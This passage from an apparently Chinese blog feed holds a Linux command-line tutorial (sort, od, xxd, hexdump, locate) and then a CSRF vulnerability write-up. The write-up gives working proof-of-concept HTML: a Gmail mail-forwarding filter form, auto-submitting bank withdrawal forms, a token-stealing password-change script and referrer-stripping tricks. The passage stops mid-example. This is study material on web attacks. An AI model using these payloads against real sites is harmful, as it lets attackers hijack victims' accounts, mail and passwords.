class="line">z</span><br><span class="line">zs</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="u选项"><a href="#u选项" class="headerlink" title="-u选项"></a>-u选项</h3><p>输出行中去除重复行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png$ cat flag.txt </span><br><span class="line">gong xinao </span><br><span class="line">ao</span><br><span class="line">bs</span><br><span class="line">wdh</span><br><span class="line">h</span><br><span class="line">daw</span><br><span class="line">r</span><br><span class="line">tq</span><br><span class="line">z</span><br><span class="line">zs</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">ddd</span><br><span class="line"></span><br><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png$ sort -u flag.txt </span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">ao</span><br><span class="line">b</span><br><span class="line">bs</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">daw</span><br><span class="line">ddd</span><br><span class="line">gong xinao </span><br><span class="line">h</span><br><span class="line">r</span><br><span class="line">tq</span><br><span class="line">wdh</span><br><span class="line">z</span><br><span class="line">zs</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="r选项"><a href="#r选项" class="headerlink" title="-r选项"></a>-r选项</h3><p>sort默认的排序方式是升序，如果想改成降序，就加个-r就搞定了。</p><h3 id="o选项"><a href="#o选项" class="headerlink" title="-o选项"></a>-o选项</h3><p>把排序结果输出到原文件中。</p><h3 id="n选项"><a href="#n选项" class="headerlink" title="-n选项"></a>-n选项</h3><p>以数值来排序.</p><h3 id="t与-k选项"><a href="#t与-k选项" class="headerlink" title="-t与-k选项"></a>-t与-k选项</h3><p>-t选项，后面可以设定间隔符。</p><p>-k选项，来指定列数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady/output/png$ sort -n -k <span class="number">2</span> -t : flag.txt</span><br><span class="line">apple:<span class="number">10</span>:<span class="number">2.5</span></span><br><span class="line">orange:<span class="number">20</span>:<span class="number">3.4</span></span><br><span class="line">banana:<span class="number">30</span>:<span class="number">5.5</span></span><br><span class="line">pear:<span class="number">90</span>:<span class="number">2.3</span></span><br><span class="line">steady@steady:~/桌面/steady/output/png$ cat flag.txt </span><br><span class="line">banana:<span class="number">30</span>:<span class="number">5.5</span></span><br><span class="line">apple:<span class="number">10</span>:<span class="number">2.5</span></span><br><span class="line">pear:<span class="number">90</span>:<span class="number">2.3</span></span><br><span class="line">orange:<span class="number">20</span>:<span class="number">3.4</span></span><br></pre></td></tr></table></figure><h3 id="去重复"><a href="#去重复" class="headerlink" title="去重复"></a>去重复</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort -u</span><br></pre></td></tr></table></figure><h2 id="od"><a href="#od" class="headerlink" title="od"></a>od</h2><p>Linux od命令用于输出文件内容。</p><p>od(octal dump)命令可以以八进制、十进制、十六进制和ASCII码的格式来显示文件或者流，它们对于访问或可视地检查文件中不能直接显示在终端上的字符（如换行符等）很有用。此外，在一些有空洞的文件中可以通过od命令查看空洞的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">od [-A 地址进制] [-t 显示格式] 文件名</span><br></pre></td></tr></table></figure><p><code>-A</code> ( 地址进制)按指定的进制显示地址信息;<br><code>-t</code> 指定数据显示的格式。</p><h3 id="A"><a href="#A" class="headerlink" title="-A"></a>-A</h3><p><code>-A</code> 指定的地址进制包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-A, --address-radix&#x3D;RADIX</span><br><span class="line">         在输出中以何种格式来表示地址偏移，其中RADIX的可选值有[doxn]。d表示Decimal,</span><br><span class="line">         o表示Octal，x表示Hex，n表示None</span><br><span class="line">          o：八进制（系统默认值）</span><br><span class="line">          d：十进制</span><br><span class="line">          x：十六进制</span><br><span class="line">          n：不打印位移值</span><br></pre></td></tr></table></figure><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p><code>-t</code> 指定数据的显示格式的主要参数有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-t, --format&#x3D;TYPE</span><br><span class="line">         指定输出格式，格式包括a、c、d、f、o、u和x，各含义如下：</span><br><span class="line">         1) a: named character, ignoring high-order bit</span><br><span class="line">         2) c: select printable characters or backslash escapes</span><br><span class="line">         3) d[SIZE]：十进制，正负数都包含，SIZE字节组成一个十进制整数；</span><br><span class="line">         4) f[SIZE]：浮点，SIZE字节组成一个浮点数；</span><br><span class="line">         5) o[SIZE]：八进制，SIZE字节组成一个八进制数；</span><br><span class="line">         6) u[SIZE]：无符号十进制，只包含正数，SIZE字节组成一个无符号十进制整数；</span><br><span class="line">         7) x[SIZE]：十六进制，SIZE字节为单位以十六进制输出，即输出时一列包含SIZE字节</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ pwd | od -A n -t x1</span><br><span class="line"> 2f 68 6f 6d 65 2f 73 74 65 61 64 79 0a</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ pwd | od -A n -t x1 | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39;</span><br><span class="line">2f686f6d652f7374656164790a</span><br></pre></td></tr></table></figure><h2 id="tr-1"><a href="#tr-1" class="headerlink" title="tr"></a>tr</h2><h3 id="去掉空行"><a href="#去掉空行" class="headerlink" title="去掉空行"></a>去掉空行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tr -s &quot;\n&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ tshark -r &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;attachment.pcapng  -T fields -e &quot;data&quot; | tr -s &quot;\n&quot;</span><br></pre></td></tr></table></figure><h2 id="xxd"><a href="#xxd" class="headerlink" title="xxd"></a>xxd</h2><p>xxd 命令可以将指定文件或标准输入以十六进制转储，也可以把十六进制转储转换成原来的二进制形式。</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>逆向操作: 把xxd的十六进制输出内容转换回原文件的二进制内容。</p><h3 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h3><p>以postscript的连续十六进制转储输出。这也叫做纯十六进制转储。</p><h3 id="十六进制转化成ascii"><a href="#十六进制转化成ascii" class="headerlink" title="十六进制转化成ascii"></a>十六进制转化成ascii</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r -p</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ xxd -r -p 1.txt</span><br></pre></td></tr></table></figure><h2 id="head"><a href="#head" class="headerlink" title="head"></a>head</h2><p>语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head(选项)(参数)</span><br></pre></td></tr></table></figure><p>选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-n&lt;数字&gt;：指定显示头部内容的行数；</span><br><span class="line">-c&lt;字符数&gt;：指定显示头部内容的字符数；</span><br><span class="line">-v：总是显示文件名的头信息；</span><br><span class="line">-q：不显示文件名的头信息。</span><br></pre></td></tr></table></figure><h2 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>diff 命令是 linux上非常重要的工具，用于比较文件的内容，特别是比较两个版本不同的文件以找到改动的地方。diff在命令行中打印每一个行的改动。最新版本的diff还支持二进制文件。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-adiff预设只会逐行比较文本文件</span><br><span class="line">-b不检查空格字符的不同</span><br><span class="line">-W在使用-y参数时，指定栏宽</span><br><span class="line">-x不比较选项中所指定的文件或目录</span><br><span class="line">-X您可以将文件或目录类型存成文本文件，然后在&#x3D;&lt;文件&gt;中指定此文本文件</span><br><span class="line">-y以并列的方式显示文件的异同之处</span><br><span class="line">--help查看帮助信息</span><br><span class="line">--left-column在使用-y参数时，若两个文件某一行内容相同，则仅在左侧的栏位显示该行内容</span><br><span class="line">--suppress-common-lines在使用-y参数时，仅显示不同之处</span><br></pre></td></tr></table></figure><h2 id="hexdump"><a href="#hexdump" class="headerlink" title="hexdump"></a>hexdump</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件的十六进制，而不只限于二进制文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-n length：格式化输出文件的前length个字节</span><br><span class="line">-C：输出规范的十六进制和ASCII码</span><br><span class="line">-b：单字节八进制显示</span><br><span class="line">-c：单字节字符显示</span><br><span class="line">-d：双字节十进制显示</span><br><span class="line">-o：双字节八进制显示</span><br><span class="line">-x：双字节十六进制显示</span><br><span class="line">-s：从偏移量开始输出</span><br><span class="line">-e 指定格式字符串，格式字符串由单引号包含，格式字符串形如：’a/b “format1” “format2”。每个格式字符串由三部分组成，每个由空格分割，如a/b表示，b表示对每b个输入字节应用format1格式，a表示对每个a输入字节应用format2，一般a&gt;b，且b只能为<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>，另外a可以省略，省略a=<span class="number">1</span>。format1和format2中可以使用类似printf的格斯字符串。</span><br><span class="line">%<span class="number">02</span>d：两位十进制</span><br><span class="line">%<span class="number">03</span>x：三位十六进制</span><br><span class="line">%<span class="number">02</span>o：两位八进制</span><br><span class="line">%c：单个字符等</span><br><span class="line">%_ad：标记下一个输出字节的序号，用十进制表示</span><br><span class="line">%_ax：标记下一个输出字节的序号，用十六进制表示</span><br><span class="line">%_ao：标记下一个输出字节的序号，用八进制表示</span><br><span class="line">%_p：对不能以常规字符显示的用.代替</span><br><span class="line">同一行显示多个格式字符串，可以跟多个-e选项</span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>格式化输出从20开始的10个字节，并以16进制显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -n 10 -C -s 20</span><br></pre></td></tr></table></figure><h1 id="Linux系统快速查找文件的技巧"><a href="#Linux系统快速查找文件的技巧" class="headerlink" title="Linux系统快速查找文件的技巧"></a>Linux系统快速查找文件的技巧</h1><h2 id="locate"><a href="#locate" class="headerlink" title="locate"></a>locate</h2><p>locate用于快速查找任何文件。它从一个系统数据库进行文件查找，而不需要遍历磁盘，因此速度极快。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常见选项如下：</span><br><span class="line">-e  仅查找存在的文件</span><br><span class="line">-q  安静模式，不会显示任何错误讯息</span><br><span class="line">-n  至多显示 n个输出</span><br><span class="line">-r  使用正规运算式</span><br><span class="line">-i  查找忽略大小写</span><br><span class="line">-c  打印匹配结果数量</span><br></pre></td></tr></table></figure><h2 id="which"><a href="#which" class="headerlink" title="which"></a>which</h2><p>which命令会在PATH变量指定的路径中，搜索某个系统命令的位置。</p><h2 id="whereis"><a href="#whereis" class="headerlink" title="whereis"></a>whereis</h2><p>whereis命令用于搜索程序的二进制文件，源代码文件或帮助文档。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF漏洞</title>
      <link href="2018/12/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2018/12/08/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h3 id="CSRF漏洞总结"><a href="#CSRF漏洞总结" class="headerlink" title="CSRF漏洞总结"></a>CSRF漏洞总结</h3><h4 id="Gmail的CSRF漏洞"><a href="#Gmail的CSRF漏洞" class="headerlink" title="Gmail的CSRF漏洞"></a>Gmail的CSRF漏洞</h4><p>黑客诱惑受害者点击藏有恶意代码的空白页面</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_emc&quot;</span> value=<span class="string">&quot;true&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;cf2_email&quot;</span> value=<span class="string">&quot;hacker@hakermail.com&quot;</span>/&gt; </span><br><span class="line">    .....</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;irf&quot;</span> value=<span class="string">&quot;on&quot;</span>/&gt; </span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nvp_bu_cftb&quot;</span> value=<span class="string">&quot;Create Filter&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;script&gt; </span><br><span class="line">    document.forms[<span class="number">0</span>].submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了”Create Filter”命令，将所有的邮件，转发到”<a href="mailto:&#104;&#97;&#x63;&#107;&#101;&#114;&#x40;&#104;&#x61;&#107;&#x65;&#x72;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#104;&#97;&#x63;&#107;&#101;&#114;&#x40;&#104;&#x61;&#107;&#x65;&#x72;&#x6d;&#x61;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a>“。</p><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><ul><li><p>受害者登录a.com，并保留了登录凭证（Cookie）。</p></li><li><p>攻击者引诱受害者访问了b.com。</p></li><li><p>b.com伪装受害者的身份向c.com 发送了一个请求。</p></li><li><p>c.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。</p></li><li><p>攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让c.com执行了自己定义的操作。</p></li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><h5 id="GET类型的CSRF"><a href="#GET类型的CSRF" class="headerlink" title="GET类型的CSRF"></a>GET类型的CSRF</h5><p>只需要一个HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;bank.example&#x2F;withdraw?amount&#x3D;10000&amp;for&#x3D;hacker&quot; &gt; </span><br></pre></td></tr></table></figure><p>在受害者访问含有这个img的页面后，浏览器会自动向<code>http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker</code>发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。</p><h5 id="POST类型的CSRF"><a href="#POST类型的CSRF" class="headerlink" title="POST类型的CSRF"></a>POST类型的CSRF</h5><p>使用的是一个自动提交的表单</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;form action=<span class="string">&quot;http://bank.example/withdraw&quot;</span> method=POST&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;account&quot;</span> value=<span class="string">&quot;xiaoming&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;amount&quot;</span> value=<span class="string">&quot;10000&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;for&quot;</span> value=<span class="string">&quot;hacker&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; </span><br></pre></td></tr></table></figure><p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。以上两个类型不需要用户去操作，会在用户不知情的情况下自动提交请求。</p><h5 id="链接类型的CSRF"><a href="#链接类型的CSRF" class="headerlink" title="链接类型的CSRF"></a>链接类型的CSRF</h5><p>此类CSRF需要用户交互，必须用户有意识到去点击恶意连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;test.com&#x2F;csrf&#x2F;withdraw.php?amount&#x3D;1000&amp;for&#x3D;hacker&quot; taget&#x3D;&quot;_blank&quot;&gt;领取200红包&lt;a&#x2F;&gt;</span><br></pre></td></tr></table></figure><h4 id="漏洞特点"><a href="#漏洞特点" class="headerlink" title="漏洞特点"></a>漏洞特点</h4><ul><li>攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。</li><li>攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。</li><li>整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。</li><li>跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。</li></ul><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>1、无需任何验证即可删除某社区的帖子</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//zone.wooyun.org/index.php?do=edit&amp;act=delcomment&amp;fun=ajax&amp;id=311946</span></span><br></pre></td></tr></table></figure><p>2、用户在快速登录(qq、微信)之后,网站要求重新填写用户名、密码、邮箱等信息</p><p>3、网站个人后台修改密码时候无验证码、旧密码、表单token认证等操作</p><p>4、敏感操作:</p><p>刷粉丝、花钱购买图书章节阅读权限、恶意打赏、恶意刷评论</p><h4 id="利用payload"><a href="#利用payload" class="headerlink" title="利用payload"></a>利用payload</h4><p>1、get型–构造url</p><p>2、post型–burp可以直接生成poc</p><p>3、结合存储型xss,存放我们的csrfpoc</p><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><h5 id="1、Token绕过"><a href="#1、Token绕过" class="headerlink" title="1、Token绕过"></a>1、Token绕过</h5><p>页面表单会生成一个token,执行操作的时候需要带上token</p><ul><li><p>结合xss–将我们构造好的代码插入目标网站,获取用户当前的cookie、token等信息,发送到我们的网站</p><ul><li>attach()函数用于获取user_token</li><li>一个iframe标签用于隐藏访问获取一个Token</li><li>一个form表单用于将修改的密码与Token进行提交数据库</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="function">function <span class="title">attack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>=document.getElementById(<span class="string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].<span class="keyword">value</span>;</span><br><span class="line">    document.getElementById(<span class="string">&quot;transfer&quot;</span>).submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe src=<span class="string">&quot;http://192.168.0.1/xxx&quot;</span> id=<span class="string">&quot;hack&quot;</span> border=<span class="string">&quot;0&quot;</span> style=<span class="string">&quot;display:none;&quot;</span>&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;attack()&quot;</span>&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> id=<span class="string">&quot;transfer&quot;</span> action=<span class="string">&quot;http://192.168.0.109/xxx&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_new&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password_conf&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;password&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;user_token&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;Change&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></li><li><p>token在url中可见+请求包的referer字段</p><p>让用户访问我们自己的网站,从用户的请求包中的referer字段拿到用户的token</p></li><li><p>使用JSONP跨域去请求Token</p><ul><li>前提<ul><li>请求是不检查Referer</li><li>使用JSONP去跨域生成Token</li><li>回传参数可以得出，默认为callback</li><li>能够fuzz出一定回调参数的值</li></ul></li><li>利用:构造callback的值,发送JSONP请求,获取Token,进行表单构造利用,引诱点击<ul><li>▲ Token的值也可能与其他参数有关</li></ul></li></ul></li></ul><h5 id="2、referer绕过"><a href="#2、referer绕过" class="headerlink" title="2、referer绕过"></a>2、referer绕过</h5><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code> http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求</p><ul><li><p>目标站判断了referer是否正确,但是对无referer的情况没有作出判断,逻辑上出现错误</p><ul><li><p>csrfpoc使用html代码</p><p><code>&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</code></p><p>比如</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)&lt;/script&gt;  &lt;!-- 实现浏览器页面不刷新修改url链接 --&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;http://www.baidu.com/setProfile&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;nickname&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;email&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;1&amp;#64;1&amp;#46;com&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;team&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new22&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;address&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;new33&quot;</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> <span class="keyword">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>用户可以设置浏览器不传递referer</p></li><li><p>使用协议绕过</p><p>利用<code>ftp://,http://,https://,file://,javascript:,data:</code>这个时候浏览器地址栏是<code>file://</code>开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。</p><ul><li><p>利用data:协议</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;iframe src=<span 